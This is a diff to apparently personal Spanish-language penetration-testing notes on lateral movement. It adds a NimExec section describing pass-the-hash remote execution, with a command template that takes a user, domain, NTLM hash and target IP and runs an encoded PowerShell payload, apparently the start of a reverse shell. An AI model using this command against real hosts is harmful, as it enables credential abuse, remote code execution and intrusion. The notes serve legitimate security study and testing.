@@ -38,4 +38,9 @@ Por defecto usa las creds del user que está corriéndolo. Si quisieramos hacerl
 
 ### NimExec
 
-# Continuará después de comerme un alto asado
+Funciona igual que SharpNoPSExec pero permite hacer un **pass the hash**
+
+    .\NimExec -u <user> -d <domain> -h <hash> -t <ip> -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v
+
+### reg.exe
+# Continuará despues de comer un alto asado
